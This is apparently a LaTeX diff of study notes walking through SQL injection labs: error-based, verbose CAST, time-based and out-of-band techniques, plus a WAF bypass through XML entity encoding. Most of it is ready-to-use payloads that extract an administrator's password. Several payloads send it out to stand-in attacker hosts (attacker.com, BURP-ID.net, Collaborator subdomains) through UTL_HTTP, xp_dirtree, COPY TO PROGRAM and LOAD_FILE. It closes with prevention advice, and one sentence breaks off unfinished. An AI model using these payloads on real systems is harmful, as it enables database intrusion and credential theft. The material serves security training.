+\textbf{Extracting Password Character}
+\begin{verbatim}
+xyz' AND (SELECT CASE WHEN (
+    Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm'
+) THEN 1/0 ELSE 'a' END FROM Users)='a
+\end{verbatim}
+
+\textbf{Database Version Check}
+\begin{verbatim}
+xyz' AND (SELECT CASE WHEN (@@version LIKE '%MySQL%') 
+THEN 1/0 ELSE 'a' END)='a
+\end{verbatim}
+
+\subsection*{Database-Specific Conditional Error Techniques}
+
+\textbf{MySQL:}
+\begin{itemize}
+    \item \textbf{Division by Zero:} \texttt{' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 0 END)=0}
+    \item \textbf{ExtractValue (Visible Error):} \\ \texttt{' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e))--}
+\end{itemize}
+
+\textbf{Oracle:}
+\begin{itemize}
+    \item \textbf{TO\_NUMBER:} \texttt{' AND (SELECT CASE WHEN (1=1) THEN TO\_NUMBER('ERROR') ELSE 0 END) FROM DUAL--}
+\end{itemize}
+
+\begin{quote}
+    \textbf{Security Note:} Error-based injection is often faster than Boolean-based blind injection because a 500 Error is a very distinct and easy-to-detect state for automated tools to identify.
+\end{quote}
+
+\section*{Oracle Error-Based Blind SQL Injection Walkthrough}
+
+\subsection*{Initial Error Testing}
+The first step is to verify if the input parameter is vulnerable to injection and how the server handles syntax errors.
+
+\begin{itemize}
+    \item \textbf{Trigger Syntax Error:} \texttt{TrackingId=xyz'} \\
+    Result: Error message received (e.g., HTTP 500).
+    \item \textbf{Fix Syntax:} \texttt{TrackingId=xyz''} \\
+    Result: Error disappears. This confirms the single quote is breaking the query.
+\end{itemize}
+
+\subsection*{Database Fingerprinting}
+We use Oracle-specific syntax to confirm the back-end database type.
+
+\begin{itemize}
+    \item \textbf{Test Basic Subquery:} \texttt{TrackingId=xyz'||(SELECT '')||'} \\
+    Result: Error. This suggests the database requires a \texttt{FROM} clause.
+    \item \textbf{Test with Oracle DUAL Table:} \texttt{TrackingId=xyz'||(SELECT '' FROM dual)||'} \\
+    Result: No error. This confirms the database is \textbf{Oracle}.
+\end{itemize}
+
+
+
+\subsection*{Conditional Error Testing}
+To extract data, we must force the database to crash only when our specific condition is met.
+
+\medskip
+\noindent \textbf{Testing the Error Mechanism:}
+\begin{itemize}
+    \item \textbf{TRUE condition with error:}
+    \begin{verbatim}
+    TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) 
+    ELSE '' END FROM dual)||'
+    \end{verbatim}
+    Result: \textbf{Error (HTTP 500)}. The database executed the division by zero.
+    
+    \item \textbf{FALSE condition without error:}
+    \begin{verbatim}
+    TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) 
+    ELSE '' END FROM dual)||'
+    \end{verbatim}
+    Result: \textbf{No error (HTTP 200)}. The database followed the \texttt{ELSE} path.
+\end{itemize}
+
+
+
+\subsection*{Determine Password Length}
+By iterating through numerical comparisons, we can find the exact length of the administrator's password.
+
+\begin{itemize}
+    \item \textbf{Payload Example:}
+    \begin{verbatim}
+    TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>19 
+    THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+    \end{verbatim}
+    \item \textbf{Logic:} If \texttt{LENGTH > 19} causes an error but \texttt{LENGTH > 20} does not, the password is exactly 20 characters long.
+\end{itemize}
+
+\subsection*{Character Extraction with Burp Intruder}
+Once the length is known, we use Burp Intruder to automate the extraction of each character.
+
+\medskip
+\noindent \textbf{Targeted Payload for Intruder:}
+\begin{verbatim}
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' 
+THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+\end{verbatim}
+
+\begin{itemize}
+    \item \textbf{Analysis:} Look for the request that results in an HTTP 500 error. If the payload \texttt{s} triggers the error, then the a character of the password is \texttt{s}.
+\end{itemize}
+
+\section*{Verbose Error-Based SQL Injection: Extracting Data via Error Messages}
+
+\subsection*{Scenario Overview}
+In this scenario, a database misconfiguration leads to verbose error messages being returned to the user. By forcing a type-conversion error, an attacker can trick the database into displaying sensitive data as part of the error message itself. This effectively turns a "blind" injection point into a "visible" one.
+
+\subsection*{Initial Discovery}
+The attack begins by intentionally breaking the query to observe the error handling.
+
+\begin{itemize}
+    \item \textbf{Test with Single Quote:} Submitting \texttt{TrackingId=ogAZZfxtOKUELbuJ'}
+    \item \textbf{Response Error:} 
+    \begin{verbatim}
+    Unterminated string literal started at position 52 in SQL 
+    SELECT * FROM tracking WHERE id = '''. Expected char
+    \end{verbatim}
+\end{itemize}
+
+\textit{Insight: This reveals the full SQL structure and confirms that the database type is likely PostgreSQL or MSSQL based on the error phrasing.}
+
+\subsection*{Syntax Correction and CAST Operations}
+To extract data, we must create a query that is syntactically correct but logically flawed (triggering an error).
+
+\begin{itemize}
+    \item \textbf{Fixing the Syntax:} \texttt{TrackingId=ogAZZfxtOKUELbuJ'---} 
+    The \texttt{--} comments out the trailing single quote, making the query valid again.
+    
+    \item \textbf{The CAST Trick:} We attempt to convert the result of a subquery (a string) into an integer.
+    \begin{verbatim}
+    Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
+    \end{verbatim}
+    If the above returns no error, the injection point is ready for data extraction.
+\end{itemize}
+
+
+
+\subsection*{Extracting Usernames and Passwords}
+By replacing \texttt{SELECT 1} with a query for sensitive columns, the database will attempt to "cast" the found string into a number and fail.
+
+\begin{itemize}
+    \item \textbf{Targeting the Username:}
+    \begin{verbatim}
+    Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+    \end{verbatim}
+    \item \textbf{The Resulting Leaked Data:}
+    \begin{verbatim}
+    ERROR: invalid input syntax for type integer: "administrator"
+    \end{verbatim}
+    
+    \item \textbf{Targeting the Password:}
+    \begin{verbatim}
+    Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+    \end{verbatim}
+    \item \textbf{The Resulting Leaked Data:}
+    \begin{verbatim}
+    ERROR: invalid input syntax for type integer: "s3cur3p@ssw0rd123"
+    \end{verbatim}
+\end{itemize}
+
+\subsection*{Mechanism of the CAST Leak}
+The vulnerability lies in the sequence of operations within the database engine:
+\begin{enumerate}
+    \item The subquery \texttt{SELECT username FROM users LIMIT 1} executes and retrieves the string \texttt{'administrator'}.
+    \item The \texttt{CAST} function attempts to convert \texttt{'administrator'} into an \texttt{integer}.
+    \item The conversion fails because letters cannot be integers.
+    \item The database generates an error message that includes the value it \textit{tried} to convert, thereby printing the sensitive data to the screen.
+\end{enumerate}
+
+
+
+\subsection*{Database Detection via Error Patterns}
+Attackers can identify the backend DBMS by the specific formatting of the conversion error:
+
+\begin{center}
+\begin{tabular}{|l|l|}
+\hline
+\textbf{Error Message Pattern} & \textbf{Likely Database} \\ \hline
+\texttt{invalid input syntax for type integer} & PostgreSQL \\ \hline
+\texttt{Conversion failed when converting...} & MS SQL Server \\ \hline
+\texttt{Truncated incorrect INTEGER value} & MySQL \\ \hline
+\texttt{invalid number} & Oracle \\ \hline
+\end{tabular}
+\end{center}
+
+\subsection*{Handling Character Limits}
+If the \texttt{TrackingId} cookie has a length restriction, the following techniques are used to shorten the payload:
+
+\begin{itemize}
+    \item \textbf{Remove Original Value:} Set the original ID to an empty string (\texttt{TrackingId='}) to save space for the injection.
+    \item \textbf{Substring Extraction:} If the data itself is too long for the error message, extract it in chunks:
+    \begin{verbatim}
+    -- Extract first 10 chars
+    ' AND 1=CAST((SELECT SUBSTRING(password,1,10) FROM users LIMIT 1) AS int)--
+    \end{verbatim}
+\end{itemize}
+
+\section*{XML-Based SQL Injection with WAF Bypass}
+
+\subsection*{Vulnerability Identification}
+XML-based injection occurs when an application takes input from an XML document and uses it unsafely in a database query. Because the input is wrapped in XML tags, traditional security scanners might overlook it.
+
+\subsection*{Attack Surface Discovery}
+The target endpoint is a stock check feature that communicates via XML.
+\begin{itemize}
+    \item \textbf{Endpoint:} \texttt{POST /product/stock}
+    \item \textbf{Data Format:} XML
+    \item \textbf{Vulnerable Parameter:} \texttt{<storeId>}
+\end{itemize}
+
+\noindent \textbf{Original Request Structure:}
+\begin{verbatim}
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1</storeId>
+</stockCheck>
+\end{verbatim}
+
+\subsection*{Initial Testing and WAF Detection}
+To confirm injection, we test if the database performs mathematical evaluation on our input.
+
+\begin{itemize}
+    \item \textbf{Mathematical Evaluation:} Submitting \texttt{<storeId>1+1</storeId>}. 
+    If the application returns stock for Store \#2 instead of Store \#1, it confirms the input is being evaluated by the SQL engine.
+    
+    \item \textbf{SQL Keyword Testing:} Submitting \texttt{<storeId>1 UNION SELECT NULL</storeId>}.
+    \textbf{Result:} The request is blocked (e.g., HTTP 403 Forbidden). This indicates a Web Application Firewall (WAF) or an Intrusion Detection System (IDS) is inspecting the XML content for SQL keywords.
+\end{itemize}
+
+
+
+\subsection*{WAF Bypass Using XML Encoding}
+WAFs often search for plaintext strings like \texttt{UNION} or \texttt{SELECT}. However, XML parsers are designed to decode "entities" (like \texttt{\&\#x41;} for 'A') before the data is passed to the application logic.
+
+\subsection*{XML Entity Encoding Strategy}
+By converting the SQL payload into hex or decimal XML entities, the WAF sees a string of random-looking characters, while the database receives the intended SQL command.
+
+\medskip
+\noindent \textbf{Encoding Comparison:}
+\begin{itemize}
+    \item \textbf{Original Payload:} \texttt{1 UNION SELECT NULL}
+    \item \textbf{Hex Encoded:} \texttt{1\&\#x55;\&\#x4e;\&\#x49;\&\#x4f;\&\#x4e;\&\#x20;\&\#x53;...}
+    \item \textbf{Decimal Encoded:} \texttt{1\&\#85;\&\#78;\&\#73;\&\#79;\&\#78;\&\#32;\&\#83;...}
+\end{itemize}
+
+
+
+\subsection*{Automating Bypass with Hackvertor}
+In Burp Suite, the \textbf{Hackvertor} extension can automate this process using tags that encode the content in real-time.
+
+\begin{enumerate}
+    \item Highlight the payload: \texttt{1 UNION SELECT NULL}
+    \item Right-click $\rightarrow$ Extensions $\rightarrow$ Hackvertor $\rightarrow$ Encode $\rightarrow$ \texttt{hex\_entities}.
+    \item The resulting tag looks like: \texttt{<@hex\_entities>1 UNION SELECT NULL<@/hex\_entities>}.
+\end{enumerate}
+
+\begin{quote}
+    \textbf{Key Takeaway:} Obfuscation via encoding is one of the most effective ways to bypass pattern-matching security controls. Always test multiple encoding types (URL, Hex, Unicode, Base64) when a WAF is present.
+\end{quote}
+
+\newpage
+
+\section*{Time-Based Blind SQL Injection}
+
+\subsection*{What is Time-Based Blind SQL Injection?}
+Time-based blind SQL injection is an inferential technique used when the application does not return any data or database errors in its HTTP responses. It relies on the database pausing its execution for a specific duration when a condition is met. By measuring the time it takes for the server to respond, an attacker can determine if an injected query evaluated to TRUE or FALSE.
+
+\medskip
+\noindent \textbf{Core Principle:}
+\begin{itemize}
+    \item \textbf{Condition TRUE:} The database executes a sleep command $\rightarrow$ Delayed response.
+    \item \textbf{Condition FALSE:} The database skips the sleep command $\rightarrow$ Immediate response.
+\end{itemize}
+
+
+
+\subsection*{Database-Specific Time Delay Functions}
+Each database management system has its own method for pausing execution.
+
+\subsubsection*{PostgreSQL}
+\begin{itemize}
+    \item \textbf{Basic Sleep:} \texttt{SELECT pg\_sleep(10);}
+    \item \textbf{Injection Example:} \texttt{TrackingId=x'||(SELECT pg\_sleep(10))||'}
+\end{itemize}
+
+\subsubsection*{Microsoft SQL Server (MSSQL)}
+\begin{itemize}
+    \item \textbf{Basic Delay:} \texttt{WAITFOR DELAY '0:0:10'}
+    \item \textbf{Conditional:} \texttt{'; IF (1=1) WAITFOR DELAY '0:0:10'--}
+\end{itemize}
+
+\subsubsection*{MySQL / MariaDB}
+\begin{itemize}
+    \item \textbf{Basic Sleep:} \texttt{SLEEP(10)}
+    \item \textbf{Conditional:} \texttt{SELECT IF(1=1, SLEEP(10), 0)}
+\end{itemize}
+
+\subsubsection*{Oracle}
+\begin{itemize}
+    \item \textbf{Built-in Procedure:} \texttt{BEGIN DBMS\_LOCK.SLEEP(10); END;}
+    \item \textbf{Alternative Function:} \texttt{DBMS\_PIPE.RECEIVE\_MESSAGE('a',10)}
+\end{itemize}
+
+\subsection*{Attack Methodology}
+
+\subsubsection*{Step 1: Confirming the Vulnerability}
+Before attempting to extract data, we must prove the server is susceptible to timing-based commands.
+\begin{enumerate}
+    \item \textbf{Trigger Delay:} \texttt{TrackingId=x'||pg\_sleep(10)--} (Expect ~10s response).
+    \item \textbf{Validate Control:} \texttt{TrackingId=x'||pg\_sleep(0)--} (Expect immediate response).
+\end{enumerate}
+
+\subsubsection*{Step 2: Conditional Time Delays}
+Once confirmed, we wrap the sleep function in a \texttt{CASE} statement to test logical conditions.
+\begin{verbatim}
+Cookie: TrackingId=x'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) 
+ELSE pg_sleep(0) END)||'
+\end{verbatim}
+
+\subsubsection*{Step 3: Data Extraction}
+Data is extracted bit-by-bit or character-by-character. To optimize this, attackers often use \textbf{ASCII} values and \textbf{Binary Search} (\texttt{>} or \texttt{<} operators) to reduce the number of requests.
+
+\medskip
+\noindent \textbf{Extracting First Password Character:}
+\begin{verbatim}
+Cookie: TrackingId=x'||(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') 
+THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users 
+WHERE username='administrator')||'
+\end{verbatim}
+
+\section*{Time-Based Blind SQL Injection: Complete Walkthrough}
+
+\subsection*{Understanding the Payload Structure}
+When an application suppresses all output and errors, we use timing to "ask" the database questions. 
+
+\medskip
+\noindent \textbf{Decoded Payload Analysis:}
+\begin{verbatim}
+TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+\end{verbatim}
+
+\begin{itemize}
+    \item \texttt{x'} - Breaks the original SQL string literal.
+    \item \texttt{;} - The semicolon acts as a query separator, allowing us to append a new command.
+    \item \texttt{SELECT CASE...} - A logical gate that executes \texttt{pg\_sleep(10)} if the condition is TRUE.
+    \item \texttt{--} - Comments out the rest of the original query to prevent syntax errors.
+\end{itemize}
+
+
+
+\subsection*{Confirming the Vulnerability}
+\begin{itemize}
+    \item \textbf{Test 1: Always TRUE Condition} \\
+    \texttt{TrackingId=x'\%3BSELECT+CASE+WHEN+(1=1)+THEN+pg\_sleep(10)...} \\
+    \textbf{Result:} 10 second delay observed.
+    
+    \item \textbf{Test 2: Always FALSE Condition} \\
+    \texttt{TrackingId=x'\%3BSELECT+CASE+WHEN+(1=2)+THEN+pg\_sleep(10)...} \\
+    \textbf{Result:} Immediate response.
+\end{itemize}
+
+\subsection*{Determining Password Length}
+We use the \texttt{LENGTH()} function to incrementally test the password size until the delay disappears.
+
+\begin{itemize}
+    \item \textbf{Example:} \texttt{...CASE WHEN (LENGTH(password)>19) THEN pg\_sleep(10)...} $\rightarrow$ \textbf{Delay}.
+    \item \textbf{Example:} \texttt{...CASE WHEN (LENGTH(password)>20) THEN pg\_sleep(10)...} $\rightarrow$ \textbf{No Delay}.
+    \item \textbf{Conclusion:} The password is exactly 20 characters long.
+\end{itemize}
+
+
+
+\subsection*{Burp Intruder Configuration}
+To extract the password, we automate the process using Burp Intruder.
+
+\noindent \textbf{1. Set Payload Positions}
+
+\noindent \textbf{2. Resource Pool (Critical)}
+\begin{itemize}
+    \item \textbf{Setting:} Maximum concurrent requests = \textbf{1}.
+    \item \textbf{Reason:} If requests are sent in parallel, the server's response time for one request might be delayed by a different request's \texttt{pg\_sleep}, leading to false positives.
+\end{itemize}
+
+
+\subsection*{Analyzing Intruder Results}
+Once the attack starts, we sort the results by the \textbf{"Response received"} column (measured in milliseconds).
+
+\begin{center}
+\begin{tabular}{|c|c|c|c|}
+\hline
+\textbf{Payload} & \textbf{Status} & \textbf{Response received (ms)} & \textbf{Result} \\ \hline
+a & 200 & 125 & No Match \\ \hline
+b & 200 & 132 & No Match \\ \hline
+\textbf{7} & \textbf{200} & \textbf{10023} & \textbf{MATCH!} \\ \hline
+\end{tabular}
+\end{center}
+
+\begin{itemize}
+    \item \textbf{Optimization:} To save time, reduce the \texttt{pg\_sleep} duration to 
+\end{itemize}
+
+\newpage
+
+
+\section*{Out-of-Band (OAST) Blind SQL Injection}
+
+\subsection*{What is OAST SQL Injection?}
+Out-of-Band Application Security Testing (OAST) is a technique used when all "In-band" methods fail. It is necessary when queries execute asynchronously, no database errors are returned, and there are no timing differences in responses. 
+
+The attacker triggers the database to make an external network call (DNS or HTTP) to a server they control, embedding the sensitive data within the request.
+
+
+\section*{Why DNS is Effective for OAST}
+
+While Out-of-Band (OAST) attacks can theoretically use various protocols (HTTP, SMB, FTP), DNS is widely considered the "gold standard" for data exfiltration during SQL injection for several strategic reasons.
+
+
+
+\subsection*{Bypassing Firewalls and Egress Filtering}
+In hardened environments, database servers are strictly prohibited from making outbound HTTP/S connections to the internet. However, almost all servers require DNS (UDP Port 53) to resolve internal hostnames or software update mirrors. Consequently, firewalls are rarely configured to block outbound DNS queries, allowing the SQL payload to "phone home" even when other channels are dead.
+
+\subsection*{Data Exfiltration via Subdomains}
+DNS allows an attacker to prepend sensitive information to the lookup request. Instead of requesting a static domain, the attacker forces the database to resolve a dynamic subdomain.
+\begin{itemize}
+    \item \textbf{Example:} \texttt{s3cur3p@ssword.abc123def456.burpcollaborator.net}
+    \item \textbf{Result:} The sensitive data (\texttt{s3cur3p@ssword}) is transmitted as part of the DNS hierarchy without ever establishing a direct TCP connection.
+\end{itemize}
+
+\subsection*{Ease of Monitoring}
+By using a dedicated listener like \textbf{Burp Collaborator}, an attacker can monitor for incoming DNS "A" or "AAAA" record lookups. Every time the database evaluates the malicious SQL string, a new entry appears in the attacker's logs, providing a clear and organized stream of exfiltrated data.
+
+\subsection*{Relative Stealth}
+DNS traffic is ubiquitous and high-volume. In a typical corporate network, thousands of DNS queries are made every minute. An individual query containing an encoded subdomain is much harder for automated Security Information and Event Management (SIEM) systems to flag as "malicious" compared to an unusual HTTP request from a database server to an unknown external IP address.
+
+
+
+\begin{quote}
+    \textbf{Summary:} DNS is effective because it exploits a fundamental, trusted protocol that is essential for network operations, turning a standard lookup service into a covert data transport layer.
+\end{quote}
+
+
+\section*{Oracle OAST SQL Injection: XXE Integration Walkthrough}
+
+\subsection*{Understanding the Hybrid Payload}
+This technique uses Oracle's XML processing capabilities to trigger an External Entity (XXE) request. This is particularly effective on Oracle installations where direct network packages like \texttt{UTL\_HTTP} might be restricted, but \texttt{xmltype} parsing is permitted.
+
+\medskip
+\noindent \textbf{The Decoded Payload:}
+\begin{verbatim}
+TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" 
+encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM 
+"http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
+\end{verbatim}
+
+\subsection*{Payload Breakdown}
+\begin{itemize}
+    \item \textbf{EXTRACTVALUE(xmltype(...), '/l')}: An Oracle function that parses a string as XML. The \texttt{'/l'} is a dummy XPath search.
+    \item \textbf{Embedded XXE}: The XML string contains a \texttt{DOCTYPE} declaration with a \texttt{SYSTEM} entity.
+    \item \textbf{The Trigger}: When Oracle parses this XML, it attempts to resolve the external entity (\texttt{\%remote}), forcing the server to make an outbound HTTP request to the specified URL.
+\end{itemize}
+
+
+
+\subsection*{Step-by-Step Attack Process}
+
+\subsubsection*{Step 1: Prepare Burp Collaborator}
+Generate a unique domain in the Burp Collaborator client (e.g., \texttt{abc123def456.burpcollaborator.net}). This server will listen for the "callback" from the vulnerable Oracle database.
+
+\subsubsection*{Step 2: Craft the Injection}
+The payload must be URL-encoded to ensure the XML tags do not break the HTTP request. 
+
+\begin{verbatim}
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+
+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+
+"http%3a//abc123def456.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+\end{verbatim}
+
+\subsubsection*{Step 3: Monitor and Poll}
+Send the request and click \textbf{"Poll now"} in the Collaborator client. A successful hit will show an HTTP \texttt{GET} request from the database server's IP address.
+
+\subsection*{Data Exfiltration Variants}
+To actually steal data, we concatenate the results of a subquery into the Collaborator subdomain.
+
+\medskip
+\noindent \textbf{Extracting the Administrator Password:}
+\begin{verbatim}
+TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" 
+encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'
+||(SELECT password FROM users WHERE username='administrator')||
+'.abc123def456.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
+\end{verbatim}
+\textit{Result:} If the password is "P4ssw0rd", Burp Collaborator will receive a request for: \\ \texttt{http://P4ssw0rd.abc123def456.burpcollaborator.net/}
+
+
+
+\subsection*{Alternative Oracle OAST Techniques}
+If \texttt{xmltype} is blocked, try these alternative Oracle packages:
+
+\begin{itemize}
+    \item \textbf{UTL\_INADDR (DNS):} 
+    \texttt{SELECT UTL\_INADDR.get\_host\_address('data.attacker.com')}
+    \item \textbf{UTL\_HTTP (HTTP):} 
+    \texttt{SELECT UTL\_HTTP.REQUEST('http://attacker.com/data')}
+    \item \textbf{HTTPURITYPE (HTTP):} 
+    \texttt{SELECT HTTPURITYPE('http://data.attacker.com').getclob()}
+\end{itemize}
+
+\begin{quote}
+    \textbf{Pro Tip:} Concatenating multiple rows into a single DNS request (e.g., \texttt{username||':'||password}) is the most efficient way to exfiltrate entire tables via OAST.
+\end{quote}
+
+
+
+\section*{Quick Reference: Database-Specific OAST Payloads}
+
+\subsection*{Oracle Database}
+Oracle OAST often leverages XML functions or built-in packages to trigger network activity.
+
+\begin{itemize}
+    \item \textbf{Using XXE (Works on unpatched Oracle):}
+    \begin{verbatim}
+    SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password 
+    FROM users WHERE username='administrator')||'.BURP-ID.net/"> %remote;]>'),
+    '/l') FROM dual
+    \end{verbatim}
+    
+    \item \textbf{Using UTL\_INADDR (Requires elevated privileges):}
+    \begin{verbatim}
+    SELECT UTL_INADDR.get_host_address((SELECT password FROM users 
+    WHERE username='administrator')||'.BURP-ID.net')
+    \end{verbatim}
+\end{itemize}
+
+\subsection*{Microsoft SQL Server}
+MSSQL utilizes UNC paths and file system stored procedures to trigger DNS resolutions.
+
+\begin{itemize}
+    \item \textbf{Using xp\_dirtree:}
+    \begin{verbatim}
+    declare @p varchar(1024);set @p=(SELECT password FROM users 
+    WHERE username='administrator');exec('master..xp_dirtree "//'
+    +@p+'.BURP-ID.net/a"')
+    \end{verbatim}
+    
+    \item \textbf{Using xp\_fileexist:}
+    \begin{verbatim}
+    exec master..xp_fileexist '\\BURP-ID.net\test'
+    \end{verbatim}
+\end{itemize}
+
+
+
+\subsection*{PostgreSQL}
+PostgreSQL can use the \texttt{COPY} command to interact with the underlying OS or \texttt{dblink} for remote database connections.
+
+\begin{itemize}
+    \item \textbf{Using COPY command:}
+    \begin{verbatim}
+    copy (SELECT '') to program 'nslookup '||(SELECT password FROM users 
+    WHERE username='administrator')||'.BURP-ID.net'
+    \end{verbatim}
+    
+    \item \textbf{Using dblink:}
+    \begin{verbatim}
+    SELECT * FROM dblink('host='||(SELECT password FROM users 
+    LIMIT 1)||'.BURP-ID.net user=test', 'SELECT 1') AS t(x integer)
+    \end{verbatim}
+\end{itemize}
+
+\subsection*{MySQL (Windows Only)}
+On Windows-based MySQL installations, file functions can be used to resolve UNC paths.
+
+\begin{itemize}
+    \item \textbf{Using LOAD\_FILE:}
+    \begin{verbatim}
+    SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users 
+    WHERE username='administrator'),'.BURP-ID.net\\test.txt'))
+    \end{verbatim}
+    
+    \item \textbf{Using INTO OUTFILE:}
+    \begin{verbatim}
+    SELECT password FROM users WHERE username='administrator' 
+    INTO OUTFILE '\\\\BURP-ID.net\a'
+    \end{verbatim}
+\end{itemize}
+
+
+
+
+\begin{quote}
+    \textbf{Security Warning:} OAST payloads often require specific privileges or configurations (e.g., \texttt{secure\_file\_priv} in MySQL) to be enabled. Always verify the permissions of the database user during your assessment.
+\end{quote}
+
+
+\newpage
+
+\section*{SQL Injection Methodology: Comparison and Selection}
+
+This table summarizes the primary SQL injection techniques. Choosing the correct method depends entirely on the feedback provided by the web application and the database server.
+
+
+
+\begin{center}
+\begin{tabular}{|l|l|l|l|}
+\hline
+\textbf{Technique} & \textbf{Detection Signal} & \textbf{Data Extraction Speed} & \textbf{Use Case} \\ \hline
+\textbf{In-band (UNION)} & Visible data on page & Very Fast (Entire rows) & Direct output allowed \\ \hline
+\textbf{Error-Based} & Verbose/Change in error & Fast (Via error logs) & Results hidden, errors visible \\ \hline
+\textbf{Boolean Blind} & Content change (True/False) & Slow (Bit-by-bit) & Errors and results hidden \\ \hline
+\textbf{Time-Based Blind} & Delay in server response & Very Slow (Character-by-character) & No visible changes at all \\ \hline
+\textbf{Out-of-Band} & External DNS/HTTP logs & Moderate to Fast & All in-band channels blocked \\ \hline
+\end{tabular}
+\end{center}
+
+\subsection*{Selection Logic Flow}
+To determine which attack to use, follow this logical progression during a penetration test:
+
+\begin{itemize}
+    \item \textbf{Can I see the query results?} $\rightarrow$ Use \textbf{UNION-based} injection.
+    \item \textbf{Can I see database error messages?} $\rightarrow$ Use \textbf{Verbose Error-Based} (CAST/TO\_NUMBER).
+    \item \textbf{Does the page content change (e.g., "Welcome" appears)?} $\rightarrow$ Use \textbf{Boolean-Based Blind}.
+    \item \textbf{Does a 500 Error only appear on certain conditions?} $\rightarrow$ Use \textbf{Conditional Error-Based}.
+    \item \textbf{Is the response identical no matter what I do?} $\rightarrow$ Use \textbf{Time-Based Blind}.
+\end{itemize}
+
+\subsection*{Final Prevention Recommendations}
+Regardless of the type of SQL injection discovered, the remediation steps remain consistent across all modern web environments:
+
+\begin{itemize}
+    \item \textbf{Parameterized Queries (Prepared Statements):} This is the primary defense. It ensures the database treats user input as data only, never as executable code.
+    \item \textbf{Input Validation:} Use an allow-list approach to ensure input matches expected formats (e.g., numeric IDs should only contain digits).
+    \item \textbf{Least Privilege:} The application's database user should not have permissions to access system tables or administrative functions (like \texttt{xp\_cmdshell} or \texttt{UTL\_HTTP}).
+    \item \textbf{Generic Error Messages:} Disable verbose error reporting in production to prevent leaking schema information via error-based attacks.
+\end{itemize}
+
+\begin{quote}
+    \textbf{Conclusion:} SQL Injection remains one of the most critical web vulnerabilities. A successful defense requires a "defense-in-depth" strategy, combining secure coding practices with robust server-side configurations.
+\end{quote}
 
 \end{document}
